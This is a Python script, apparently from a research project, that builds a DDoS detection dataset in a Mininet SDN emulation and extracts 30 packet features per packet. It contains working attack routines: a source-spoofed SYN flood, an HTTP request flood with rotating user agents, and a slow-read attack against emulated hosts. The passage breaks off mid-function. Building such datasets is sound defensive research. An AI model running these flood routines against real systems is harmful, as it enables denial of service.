#!/usr/bin/env python3
"""
AdDDoSDN Dataset Generation Framework v3.0
30-Feature Real-Time DDoS Detection Dataset

This script generates packet-level network traffic datasets optimized for
real-time DDoS detection using 30 extractable features.

FEATURES:
- 30-feature packet extraction (24 pure live + 4 minimal calculation + 2 labels)
- Real-time optimized feature set for <1ms latency
- Comprehensive attack scenarios (enhanced traditional + adversarial)
- Timeline-ordered feature extraction for ML training
- Independent implementation (does not modify mainv1 or mainv2)

USAGE:
  # Basic usage (auto-detect cores)
  sudo python3 mainv3.py
  
  # Specify configuration file
  sudo python3 mainv3.py config.json
  
  # Optimize for 16-core server
  sudo python3 mainv3.py --max-cores 16
  
  # Custom PCAP processing cores + server cores
  sudo python3 mainv3.py --cores 12 --max-cores 16

30-FEATURE SET:
1. Pure Live Extractable (24): eth_type, ip_src, ip_dst, ip_proto, ip_ttl, ip_id, 
   ip_flags, ip_len, ip_tos, ip_version, ip_frag_offset, src_port, dst_port, 
   tcp_flags, tcp_seq, tcp_ack, tcp_window, tcp_urgent, udp_sport, udp_dport, 
   udp_len, udp_checksum, icmp_type, icmp_code, icmp_id, icmp_seq
2. Minimal Calculation (4): timestamp, packet_length, transport_protocol, tcp_options_len
3. Labels (2): Label_multi, Label_binary

REQUIREMENTS:
- Ubuntu 20.04+ / Debian 11+ (recommended)
- Python 3.8+
- Root privileges (for Mininet)
- taskset (util-linux package)
- 16+ cores recommended for optimal performance
"""
import io
import sys
import re
import os
import signal
import time
import logging
import argparse
import subprocess
import threading
from pathlib import Path
import shutil
from scapy.all import rdpcap, IP, TCP, UDP, ICMP, Ether, sr1, send
from src.gen_benign_traffic import run_benign_traffic
import requests
import pandas as pd
from datetime import datetime
import json
from multiprocessing import cpu_count
from concurrent.futures import ProcessPoolExecutor

# Built-in modules for zero-installation enhancements
import statistics
import math
import hashlib
import collections
import calendar
import base64
import random
import socket
import psutil

# Import standardized logging
from src.utils.logger import get_main_logger, ConsoleOutput, initialize_logging, print_dataset_summary
from src.utils.timeline_analysis import analyze_dataset_timeline, print_detailed_timeline_report

# Enhanced PCAP processing
from src.utils.process_pcap_to_csv import process_pcap_to_csv
from src.utils.enhanced_pcap_processing import (
    validate_and_fix_pcap_timestamps,
    enhanced_process_pcap_to_csv,
    improve_capture_reliability,
    verify_pcap_integrity,
    analyze_pcap_for_tcp_issues,
    analyze_inter_packet_arrival_time
)
from src.utils.process_pcap_to_csv import _get_label_for_timestamp

# Mininet imports
from mininet.net import Mininet
from mininet.topo import Topo
from mininet.node import OVSKernelSwitch, RemoteController
from mininet.cli import CLI
from mininet.log import setLogLevel, info

# Add attacks directory to Python path
sys.path.append(str(Path(__file__).parent.resolve() / "src" / "attacks"))
from gen_syn_flood import run_attack as run_syn_flood
from gen_udp_flood import run_attack as run_udp_flood
from enhanced_icmp_flood import run_attack as run_icmp_flood

# Configuration
BASE_DIR = Path(__file__).parent.resolve()
SRC_DIR = BASE_DIR / "src"
ATTACKS_DIR = SRC_DIR / "attacks"
UTILS_DIR = SRC_DIR / "utils"
OUTPUT_DIR = BASE_DIR / "main_output" / "v3"
PCAP_FILE_NORMAL = OUTPUT_DIR / "normal.pcap"
PCAP_FILE_SYN_FLOOD = OUTPUT_DIR / "syn_flood.pcap"
PCAP_FILE_UDP_FLOOD = OUTPUT_DIR / "udp_flood.pcap"
PCAP_FILE_ICMP_FLOOD = OUTPUT_DIR / "icmp_flood.pcap"
PCAP_FILE_AD_SYN = OUTPUT_DIR / "ad_syn.pcap"
PCAP_FILE_AD_UDP = OUTPUT_DIR / "ad_udp.pcap"
PCAP_FILE_AD_SLOW = OUTPUT_DIR / "ad_slow.pcap"
PCAP_FILE_H6_SLOW_READ = OUTPUT_DIR / "h6_slow_read.pcap"
OUTPUT_CSV_FILE = OUTPUT_DIR / "packet_features_30.csv"
OUTPUT_FLOW_CSV_FILE = OUTPUT_DIR / "flow_features.csv"
RYU_CONTROLLER_APP = SRC_DIR / "controller" / "ryu_controller_app.py"

# Host IPs
HOST_IPS = {
    "h1": "10.0.0.1", "h2": "10.0.0.2", "h3": "10.0.0.3",
    "h4": "10.0.0.4", "h5": "10.0.0.5", "h6": "10.0.0.6"
}

# Configure logging
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
logger.propagate = False

# Ensure output directory exists
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

# File handler
file_handler = logging.FileHandler(OUTPUT_DIR / 'main.log')
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
logger.addHandler(file_handler)

# Console handler
console_handler = logging.StreamHandler()
console_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
logger.addHandler(console_handler)

# Attack logger
attack_logger = logging.getLogger('attack_logger')
attack_logger.setLevel(logging.DEBUG)
attack_logger.propagate = False

# File handler for attack.log
attack_log_file_handler = logging.FileHandler(OUTPUT_DIR / 'attack.log')
attack_log_file_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
attack_logger.addHandler(attack_log_file_handler)

# Console handler for attack_logger
class AttackConsoleFilter(logging.Filter):
    def filter(self, record):
        message = record.getMessage()
        if any(phrase in message for phrase in [
            "did not terminate gracefully, forcing termination",
            "slowhttptest process exited with non-zero code: -15"
        ]):
            return False
        return True

attack_console_handler = logging.StreamHandler()
attack_console_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
attack_console_handler.setLevel(logging.WARNING)
attack_console_handler.addFilter(AttackConsoleFilter())
attack_logger.addHandler(attack_console_handler)

# Suppress debug messages
logging.getLogger("urllib3").setLevel(logging.WARNING)


# =============================================================================
# 30-FEATURE EXTRACTION ENGINE
# =============================================================================

def extract_30_features_from_packet(packet, capture_time=None):
    """
    Extract 30 features from a network packet optimized for real-time DDoS detection.
    
    Returns dictionary with features in timeline-ordered format:
    timestamp,eth_type,ip_src,ip_dst,ip_proto,ip_ttl,ip_id,ip_flags,ip_len,ip_tos,
    ip_version,ip_frag_offset,src_port,dst_port,tcp_flags,tcp_seq,tcp_ack,tcp_window,
    tcp_urgent,udp_sport,udp_dport,udp_len,udp_checksum,icmp_type,icmp_code,icmp_id,
    icmp_seq,packet_length,transport_protocol,tcp_options_len
    """
    features = {
        # Initialize all features with empty values
        'timestamp': capture_time if capture_time else time.time(),
        'eth_type': '',
        'ip_src': '',
        'ip_dst': '',
        'ip_proto': '',
        'ip_ttl': '',
        'ip_id': '',
        'ip_flags': '',
        'ip_len': '',
        'ip_tos': '',
        'ip_version': '',
        'ip_frag_offset': '',
        'src_port': '',
        'dst_port': '',
        'tcp_flags': '',
        'tcp_seq': '',
        'tcp_ack': '',
        'tcp_window': '',
        'tcp_urgent': '',
        'udp_sport': '',
        'udp_dport': '',
        'udp_len': '',
        'udp_checksum': '',
        'icmp_type': '',
        'icmp_code': '',
        'icmp_id': '',
        'icmp_seq': '',
        'packet_length': len(packet),
        'transport_protocol': '',
        'tcp_options_len': ''
    }
    
    try:
        # Ethernet layer
        if hasattr(packet, 'type'):
            features['eth_type'] = hex(packet.type)
        elif Ether in packet:
            features['eth_type'] = hex(packet[Ether].type)
        
        # IP layer
        if IP in packet:
            ip = packet[IP]
            features.update({
                'ip_src': ip.src,
                'ip_dst': ip.dst,
                'ip_proto': ip.proto,
                'ip_ttl': ip.ttl,
                'ip_id': ip.id,
                'ip_flags': str(ip.flags),
                'ip_len': ip.len,
                'ip_tos': ip.tos,
                'ip_version': ip.version,
                'ip_frag_offset': ip.frag
            })
            
            # Protocol-specific extraction
            if TCP in packet:
                tcp = packet[TCP]
                features.update({
                    'src_port': tcp.sport,
                    'dst_port': tcp.dport,
                    'tcp_flags': str(tcp.flags),
                    'tcp_seq': tcp.seq,
                    'tcp_ack': tcp.ack,
                    'tcp_window': tcp.window,
                    'tcp_urgent': tcp.urgptr,
                    'tcp_options_len': len(tcp.options) if hasattr(tcp, 'options') else 0,
                    'transport_protocol': 'TCP'
                })
            elif UDP in packet:
                udp = packet[UDP]
                features.update({
                    'udp_sport': udp.sport,
                    'udp_dport': udp.dport,
                    'udp_len': udp.len,
                    'udp_checksum': udp.chksum,
                    'transport_protocol': 'UDP'
                })
            elif ICMP in packet:
                icmp = packet[ICMP]
                features.update({
                    'icmp_type': icmp.type,
                    'icmp_code': icmp.code,
                    'icmp_id': getattr(icmp, 'id', ''),
                    'icmp_seq': getattr(icmp, 'seq', ''),
                    'transport_protocol': 'ICMP'
                })
    
    except Exception as e:
        logger.debug(f"Error extracting features from packet: {e}")
    
    return features


def process_pcap_to_30_features_csv(pcap_file_path, output_csv_path, label_timeline):
    """
    Process a PCAP file and extract 30 features per packet, saving to CSV.
    Features are ordered for timeline compatibility.
    """
    logger.info(f"Processing {pcap_file_path} to 30-feature CSV...")
    
    try:
        packets = rdpcap(str(pcap_file_path))
        logger.info(f"Loaded {len(packets)} packets from {pcap_file_path}")
        
        if len(packets) == 0:
            logger.warning(f"No packets found in {pcap_file_path}")
            return
        
        packet_features = []
        
        for i, packet in enumerate(packets):
            try:
                # Extract timestamp from packet
                if hasattr(packet, 'time'):
                    packet_timestamp = float(packet.time)
                else:
                    packet_timestamp = time.time()
                
                # Extract 30 features
                features = extract_30_features_from_packet(packet, packet_timestamp)
                
                # Add labels based on timeline
                label_multi = _get_label_for_timestamp(packet_timestamp, label_timeline)
                label_binary = 1 if label_multi != 'normal' else 0
                
                features['Label_multi'] = label_multi
                features['Label_binary'] = label_binary
                
                packet_features.append(features)
                
                if (i + 1) % 10000 == 0:
                    logger.debug(f"Processed {i + 1} packets...")
                    
            except Exception as e:
                logger.debug(f"Error processing packet {i}: {e}")
                continue
        
        if packet_features:
            # Create DataFrame with specific column order
            column_order = [
                'timestamp', 'eth_type', 'ip_src', 'ip_dst', 'ip_proto', 'ip_ttl', 'ip_id', 
                'ip_flags', 'ip_len', 'ip_tos', 'ip_version', 'ip_frag_offset', 'src_port', 
                'dst_port', 'tcp_flags', 'tcp_seq', 'tcp_ack', 'tcp_window', 'tcp_urgent', 
                'udp_sport', 'udp_dport', 'udp_len', 'udp_checksum', 'icmp_type', 'icmp_code', 
                'icmp_id', 'icmp_seq', 'packet_length', 'transport_protocol', 'tcp_options_len',
                'Label_multi', 'Label_binary'
            ]
            
            df = pd.DataFrame(packet_features)
            df = df.reindex(columns=column_order)
            df.to_csv(output_csv_path, index=False)
            logger.info(f"Saved {len(packet_features)} packet features to {output_csv_path}")
        else:
            logger.warning(f"No valid packets processed from {pcap_file_path}")
            
    except Exception as e:
        logger.error(f"Error processing PCAP file {pcap_file_path}: {e}")


# =============================================================================
# CPU CORE ALLOCATION FOR OPTIMAL PERFORMANCE
# =============================================================================

class CPUCoreManager:
    """Manages CPU core allocation for different modules using taskset"""
    
    def __init__(self, total_cores=16):
        self.total_cores = total_cores
        self.core_allocation = self._calculate_core_allocation()
        
    def _calculate_core_allocation(self):
        """Calculate optimal core allocation based on total cores"""
        if self.total_cores >= 16:
            return {
                'system': [0],                    # Core 0: System/OS
                'ryu': [1],                       # Core 1: Ryu Controller
                'mininet': [2, 3, 4],            # Cores 2-4: Mininet Network (3 cores)
                'attacks': [5, 6, 7, 8, 9, 10],  # Cores 5-10: Attack Generation (6 cores)
                'background': [11],               # Core 11: Background Services
                'pcap': list(range(self.total_cores))  # All cores for PCAP processing
            }
        elif self.total_cores >= 12:
            return {
                'system': [0],
                'ryu': [1],
                'mininet': [2, 3],
                'attacks': [4, 5, 6, 7, 8],
                'background': [9],
                'pcap': list(range(self.total_cores))
            }
        elif self.total_cores >= 8:
            return {
                'system': [0],
                'ryu': [1],
                'mininet': [2, 3],
                'attacks': [4, 5, 6],
                'background': [7],
                'pcap': list(range(self.total_cores))
            }
        else:
            # Default allocation for < 8 cores
            return {
                'system': [0],
                'ryu': [1],
                'mininet': [2],
                'attacks': [3],
                'background': [0],  # Share with system
                'pcap': list(range(self.total_cores))
            }
    
    def set_process_affinity(self, process_type, pid=None):
        """Set CPU affinity for a process type"""
        if process_type not in self.core_allocation:
            logger.warning(f"Unknown process type: {process_type}")
            return False
            
        cores = self.core_allocation[process_type]
        
        try:
            if pid is None:
                # Set affinity for current process
                os.sched_setaffinity(0, cores)
                logger.info(f"✅ Set current process affinity to cores {cores} for {process_type}")
            else:
                # Set affinity for specific PID
                os.sched_setaffinity(pid, cores)
                logger.info(f"✅ Set PID {pid} affinity to cores {cores} for {process_type}")
            return True
        except Exception as e:
            logger.error(f"❌ Failed to set CPU affinity for {process_type}: {e}")
            return False
    
    def start_process_with_affinity(self, process_type, cmd, **kwargs):
        """Start a process with specific CPU affinity using taskset"""
        cores = self.core_allocation[process_type]
        core_list = ','.join(map(str, cores))
        
        # Prepend taskset command
        taskset_cmd = ['taskset', '-c', core_list] + cmd
        
        logger.info(f"🚀 Starting {process_type} on cores {cores}: {' '.join(cmd)}")
        
        try:
            process = subprocess.Popen(taskset_cmd, **kwargs)
            logger.info(f"✅ Started {process_type} with PID {process.pid} on cores {cores}")
            return process
        except Exception as e:
            logger.error(f"❌ Failed to start {process_type} with taskset: {e}")
            # Fallback to regular process start
            process = subprocess.Popen(cmd, **kwargs)
            logger.warning(f"⚠️  Started {process_type} with PID {process.pid} without CPU affinity")
            return process
    
    def get_core_info(self):
        """Get core allocation information"""
        return self.core_allocation
    
    def print_allocation(self):
        """Print current core allocation"""
        logger.info("🔧 CPU Core Allocation:")
        for process_type, cores in self.core_allocation.items():
            if process_type == 'pcap':
                logger.info(f"  {process_type.capitalize()}: Cores {cores[0]}-{cores[-1]} (all cores, post-simulation)")
            else:
                core_str = ','.join(map(str, cores))
                logger.info(f"  {process_type.capitalize()}: Cores {core_str}")

# Initialize CPU core manager (will be set in main())
cpu_manager = None


# =============================================================================
# ENHANCED ADVERSARIAL ATTACKS (from mainv2)
# =============================================================================

class IPRotator:
    """RFC 1918 private IP rotation for attacks"""
    
    def __init__(self):
        # RFC 1918 private IP address ranges for realistic IP rotation
        self.ip_ranges = {
            '10.0.0.0/8': ('10.0.0.1', '10.255.255.254'),
            '172.16.0.0/12': ('172.16.0.1', '172.31.255.254'), 
            '192.168.0.0/16': ('192.168.0.1', '192.168.255.254')
        }
    
    def get_random_ip(self):
        """Generate random IP from RFC 1918 private ranges"""
        # Select random range
        range_choice = random.choice(list(self.ip_ranges.keys()))
        
        if range_choice == '10.0.0.0/8':
            # 10.x.x.x
            return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        elif range_choice == '172.16.0.0/12':
            # 172.16-31.x.x
            return f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        else:  # 192.168.0.0/16
            # 192.168.x.x
            return f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"


class EnhancedAdvancedTechniques:
    """Enhanced Advanced DDoS attack techniques"""
    
    def __init__(self):
        self.ip_rotator = IPRotator()
        self.common_headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
        self.http_methods = ["GET", "POST", "HEAD", "OPTIONS"]
    
    def enhanced_tcp_state_exhaustion(self, dst, dport=80, num_packets_per_sec=2, duration=5, run_id="", attack_variant=""):
        """Enhanced TCP state exhaustion attack"""
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Enhanced TCP State Exhaustion - Target: {dst}:{dport}, Duration: {duration}s")
        
        end_time = time.time() + duration
        sent_packets = 0
        packet_count = 0
        start_time = time.time()
        last_log_time = start_time
        
        burst_size = max(1, int(num_packets_per_sec / 10))
        burst_interval = 0.1
        
        while time.time() < end_time:
            for _ in range(burst_size):
                if time.time() >= end_time:
                    break
                
                src = self.ip_rotator.get_random_ip()
                sport = random.randint(1024, 65535)
                
                syn_packet = IP(src=src, dst=dst, ttl=64) / \
                           TCP(sport=sport, dport=dport, flags="S", 
                               seq=random.randint(1000000, 9000000), window=65535)
                
                sent_packets += 1
                packet_count += 1
                
                try:
                    send(syn_packet, verbose=0)
                except Exception as e:
                    attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Error: {e}")
                    pass
            
            time.sleep(burst_interval)
            
            # Periodic logging
            current_time = time.time()
            if current_time - last_log_time >= 1.0:
                elapsed_time = current_time - start_time
                if elapsed_time > 0:
                    current_pps = packet_count / elapsed_time
                    attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Enhanced rate: {current_pps:.2f} pps, Total sent = {packet_count}")
                last_log_time = current_time
        
        total_elapsed_time = time.time() - start_time
        average_pps = packet_count / total_elapsed_time if total_elapsed_time > 0 else 0
        
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Enhanced TCP attack completed. Packets: {packet_count}, Rate: {average_pps:.2f} pps")
        
        return {
            "total_sent": sent_packets,
            "average_rate": average_pps,
            "type": "packets"
        }
    
    def enhanced_distributed_application_layer_attack(self, dst, dport=80, num_requests_per_sec=6, duration=5, run_id="", attack_variant=""):
        """Enhanced application layer attack"""
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Enhanced Application Layer Attack - Target: {dst}:{dport}, Duration: {duration}s")
        
        end_time = time.time() + duration
        sent_requests = 0
        successful_requests = 0
        failed_requests = 0
        start_time = time.time()
        last_log_time = start_time
        
        burst_size = max(1, int(num_requests_per_sec / 10))
        
        while time.time() < end_time:
            for _ in range(burst_size):
                if time.time() >= end_time:
                    break
                
                method = random.choice(self.http_methods)
                user_agent = random.choice(self.user_agents)
                headers = dict(self.common_headers)
                headers["User-Agent"] = user_agent
                headers["Host"] = dst
                
                session = requests.Session()
                session.headers.update(headers)
                
                sent_requests += 1
                try:
                    if method == "GET":
                        response = session.get(f"http://{dst}:{dport}/", timeout=2)
                    elif method == "POST":
                        response = session.post(f"http://{dst}:{dport}/", timeout=2)
                    elif method == "HEAD":
                        response = session.head(f"http://{dst}:{dport}/", timeout=2)
                    elif method == "OPTIONS":
                        response = session.options(f"http://{dst}:{dport}/", timeout=2)
                    
                    successful_requests += 1
                    
                except Exception as e:
                    failed_requests += 1
                    attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Enhanced request failed: {e}")
            
            time.sleep(0.1)
            
            # Periodic logging
            current_time = time.time()
            if current_time - last_log_time >= 1.0:
                elapsed_time = current_time - start_time
                if elapsed_time > 0:
                    current_rps = sent_requests / elapsed_time
                    attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Enhanced rate: {current_rps:.2f} rps, Total sent = {sent_requests}")
                last_log_time = current_time
        
        total_elapsed_time = time.time() - start_time
        average_rps = sent_requests / total_elapsed_time if total_elapsed_time > 0 else 0
        
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Enhanced App Layer attack completed. Requests: {sent_requests}, Success: {successful_requests}, Rate: {average_rps:.2f} rps")
        
        return {
            "total_sent": sent_requests,
            "total_successful": successful_requests,
            "total_failed": failed_requests,
            "average_rate": average_rps,
            "type": "requests"
        }
    
    def enhanced_advanced_slow_http_attack(self, dst, dport=80, num_connections_per_sec=2, duration=5, run_id="", attack_variant=""):
        """Enhanced slow HTTP attack"""
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Enhanced Slow HTTP Attack - Target: {dst}:{dport}, Duration: {duration}s")
        
        end_time = time.time() + duration
        sent_connections = 0
        successful_connections = 0
        failed_connections = 0
        start_time = time.time()
        last_log_time = start_time
        
        burst_size = max(1, int(num_connections_per_sec / 10))
        
        while time.time() < end_time:
            for _ in range(burst_size):
                if time.time() >= end_time:
                    break
                
                sent_connections += 1
                try:
                    success = self._enhanced_slow_read_attack(dst, dport, run_id, attack_variant)
                    if success:
                        successful_connections += 1
                    else:
                        failed_connections += 1
                except Exception as e:
                    failed_connections += 1
                    attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Enhanced slow HTTP error: {e}")
            
            time.sleep(random.uniform(0.1, 0.5))
            
            # Periodic logging
            current_time = time.time()
            if current_time - last_log_time >= 1.0:
                elapsed_time = current_time - start_time
                if elapsed_time > 0:
                    current_cps = sent_connections / elapsed_time
                    attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Enhanced rate: {current_cps:.2f} cps, Total sent = {sent_connections}")
                last_log_time = current_time
        
        total_elapsed_time = time.time() - start_time
        average_cps = sent_connections / total_elapsed_time if total_elapsed_time > 0 else 0
        
        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Enhanced Slow HTTP completed. Connections: {sent_connections}, Success: {successful_connections}, Rate: {average_cps:.2f} cps")
        
        return {
            "total_sent": sent_connections,
            "total_successful": successful_connections,
            "total_failed": failed_connections,
            "average_rate": average_cps,
            "type": "connections"
        }
    
    def _enhanced_slow_read_attack(self, dst, dport, run_id, attack_variant):
        """Enhanced slow read attack implementation"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((dst, dport))
            
            request = f"GET / HTTP/1.1\r\nHost: {dst}\r\n\r\n"
            sock.send(request.encode())
            
            # Read response very slowly
            response_data = b""
            for _ in range(50):
                try:
                    chunk = sock.recv(1)
                    if chunk:
                        response_data += chunk
                        time.sleep(random.uniform(0.05, 0.3))
                    else:
                        break
                except socket.timeout:
                    break
            
            sock.close()
            return True
            
        except Exception as e:
            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Enhanced slow read error: {e}")
            return False


# Enhanced attack runner function
def run_enhanced_adv_ddos(host, target_ip, duration, attack_variant, output_dir=None):
    """Enhanced adversarial DDoS attack runner"""
    run_id = str(int(time.time() * 1000))[-6:]  # Last 6 digits of timestamp
    attack_logger.info(f"Starting enhanced adversarial attack: {attack_variant} for {duration}s [Run ID: {run_id}]")
    
    # Initialize enhanced techniques
    enhanced_techniques = EnhancedAdvancedTechniques()
    
    try:
        if attack_variant == "ad_syn":
            # Enhanced TCP State Exhaustion
            result = enhanced_techniques.enhanced_tcp_state_exhaustion(
                dst=target_ip,
                dport=80,
                num_packets_per_sec=25,
                duration=duration,
                run_id=run_id,
                attack_variant=attack_variant
            )
            
        elif attack_variant == "ad_udp":
            # Enhanced Application Layer Attack
            result = enhanced_techniques.enhanced_distributed_application_layer_attack(
                dst=target_ip,
                dport=80,
                num_requests_per_sec=15,
                duration=duration,
                run_id=run_id,
                attack_variant=attack_variant
            )
            
        elif attack_variant == "slow_read":
            # Enhanced Slow HTTP Attack
            result = enhanced_techniques.enhanced_advanced_slow_http_attack(
                dst=target_ip,
                dport=80,
                num_connections_per_sec=8,
                duration=duration,
                run_id=run_id,
                attack_variant=attack_variant
            )
            
        else:
            attack_logger.error(f"Unknown enhanced attack variant: {attack_variant}")
            return None
        
        # Log enhanced attack completion
        if result:
            attack_logger.info(f"Enhanced {attack_variant} attack completed [Run ID: {run_id}]")
            attack_logger.info(f"Enhanced Results: {result}")
        else:
            attack_logger.error(f"Enhanced {attack_variant} attack failed [Run ID: {run_id}]")
        
        return result
        
    except Exception as e:
        attack_logger.error(f"Enhanced attack {attack_variant} failed with error: {e} [Run ID: {run_id}]")
        return None


# =============================================================================
# MAIN FRAMEWORK FUNCTIONALITY
# =============================================================================

def verify_tools():
    """Verify that all required command-line tools are installed."""
    logger.info("Verifying required tools...")
    try:
        tshark_output = subprocess.check_output(["tshark", "--version"], universal_newlines=True, stderr=subprocess.STDOUT)
        version_line = tshark_output.split('\n')[0] if tshark_output else 'unknown'
        logger.info(f"TShark version: {version_line}")
    except Exception as e:
        logger.error(f"Could not get TShark version: {e}")
        logger.error("Please install Wireshark/tshark package.")
        sys.exit(1)

    required_tools = ["ryu-manager", "mn", "tshark", "slowhttptest", "taskset"]
    for tool in required_tools:
        if not shutil.which(tool):
            logger.error(f"Tool not found: '{tool}'. Please install it manually.")
            if tool == 'tshark':
                logger.error("On Ubuntu/Debian: sudo apt-get install tshark")
                logger.error("On CentOS/RHEL: sudo yum install wireshark")
            elif tool == 'taskset':
                logger.error("On Ubuntu/Debian: sudo apt-get install util-linux")
                logger.error("On CentOS/RHEL: sudo yum install util-linux")
            sys.exit(1)
    
    logger.info("All required tools are available.")

def start_controller():
    """Start the Ryu SDN controller as a background process with CPU affinity."""
    if not RYU_CONTROLLER_APP.exists():
        logger.error(f"Ryu controller application not found at: {RYU_CONTROLLER_APP}")
        sys.exit(1)
        
    logger.info("Starting Ryu SDN controller with CPU affinity...")
    ryu_log_file = OUTPUT_DIR / "ryu.log"
    ryu_cmd = [
        "ryu-manager",
        str(RYU_CONTROLLER_APP)
    ]
    
    with open(ryu_log_file, 'wb') as log_out:
        if cpu_manager:
            # Use CPU affinity if manager is available
            process = cpu_manager.start_process_with_affinity(
                'ryu', ryu_cmd, stdout=log_out, stderr=log_out
            )
        else:
            # Fallback to regular process start
            process = subprocess.Popen(ryu_cmd, stdout=log_out, stderr=log_out)
    
    logger.info(f"Ryu controller started with PID: {process.pid}. See {ryu_log_file.relative_to(BASE_DIR)} for logs.")
    return process

def check_controller_health(port=6653, timeout=30):
    """Check if the controller is listening on its port."""
    logger.info(f"Checking for controller on port {port} (timeout: {timeout}s)...")
    for _ in range(timeout):
        try:
            result = subprocess.run(["ss", "-ltn"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, check=True)
            if f":{port}" in result.stdout:
                logger.info("Controller is up and listening.")
                return True
        except (subprocess.CalledProcessError, FileNotFoundError) as e:
            try:
                result = subprocess.run(["netstat", "-ltn"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, check=True)
                if f":{port}" in result.stdout:
                    logger.info("Controller is up and listening.")
                    return True
            except Exception:
                logger.warning("Could not check controller port. Assuming it will be ready.", exc_info=True)
                return True
        time.sleep(1)
    logger.error(f"Controller did not become available on port {port} within {timeout} seconds.")
    return False

class ScenarioTopo(Topo):
    """Custom topology for the dataset generation scenario."""
    def build(self, **_opts):
        s1 = self.addSwitch("s1", cls=OVSKernelSwitch, protocols="OpenFlow13")
        for i in range(1, 7):
            h = self.addHost(f"h{i}", ip=HOST_IPS[f"h{i}"] + "/24")
            self.addLink(h, s1)

def setup_mininet(controller_ip='127.0.0.1', controller_port=6653):
    """Create and start the Mininet network based on ScenarioTopo."""
    logger.info("Setting up Mininet topology...")
    
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    
    mininet_log_file = OUTPUT_DIR / "mininet.log"
    
    mininet_logger = logging.getLogger('mininet')
    mininet_logger.propagate = False
    mininet_logger.handlers = []
    
    file_handler = logging.FileHandler(mininet_log_file, mode='w')
    file_handler.setLevel(logging.DEBUG)
    
    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.INFO)
    
    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    file_handler.setFormatter(formatter)
    console_handler.setFormatter(formatter)
    
    mininet_logger.addHandler(file_handler)
    mininet_logger.addHandler(console_handler)
    mininet_logger.setLevel(logging.DEBUG)
    
    root_logger = logging.getLogger()
    root_logger.setLevel(logging.INFO)
    root_logger.addHandler(file_handler)
    
    try:
        mn_version = subprocess.check_output(["mn", "--version"], universal_newlines=True).strip()
        logger.info(f"Mininet version: {mn_version}")
    except Exception as e:
        logger.warning(f"Could not get Mininet version: {e}")

    topo = ScenarioTopo()
    net = Mininet(
        topo=topo,
        controller=None,
        switch=OVSKernelSwitch,
        autoSetMacs=True,
        autoStaticArp=True,
        build=False,
        cleanup=True
    )

    logger.info(f"Connecting to remote controller at {controller_ip}:{controller_port}")
    controller = RemoteController(
        'c0',
        ip=controller_ip,
        port=controller_port
    )
    net.addController(controller)

    net.build()
    net.start()

    logger.info("Mininet network started successfully.")
    return net

def run_mininet_pingall_test(net):
    """Run Mininet's pingall test to verify basic connectivity."""
    logger.info("Running Mininet pingall test...")
    time.sleep(5)
    original_stdout = sys.stdout
    sys.stdout = io.StringIO()

    original_mininet_log_level = logging.getLogger('mininet.log').level
    logging.getLogger('mininet.log').setLevel(logging.ERROR)

    try:
        result = net.pingAll()
    finally:
        sys.stdout = original_stdout
        logging.getLogger('mininet.log').setLevel(original_mininet_log_level)

    if result == 0.0:
        logger.info(f"Mininet pingall test completed successfully. Packet loss: {result}%")
    else:
        logger.error(f"Mininet pingall test failed. Packet loss: {result}%")

def start_capture(net, outfile, host=None):
    """Start improved tcpdump on a host with better timestamp handling."""
    return improve_capture_reliability(net, outfile, host=host)

def parse_flow_match_actions(match_str, actions_str):
    """Parses the match and actions strings from Ryu flow stats to extract specific fields."""
    in_port = None
    eth_src = None
    eth_dst = None
    out_port = None

    match_pattern = re.compile(r"'in_port': (\d+).*'eth_src': '([0-9a-fA-F:]+)'.*'eth_dst': '([0-9a-fA-F:]+)'")
    match_match = match_pattern.search(match_str)
    if match_match:
        in_port = int(match_match.group(1))
        eth_src = match_match.group(2)
        eth_dst = match_match.group(3)

    actions_pattern = re.compile(r"port=(\d+)")
    actions_match = actions_pattern.search(actions_str)
    if actions_match:
        out_port = int(actions_match.group(1))

    return in_port, eth_src, eth_dst, out_port

def update_flow_timeline(flow_label_timeline, label, start_time=None):
    """Update the flow label timeline with current phase information."""
    if start_time is None:
        start_time = time.time()
    
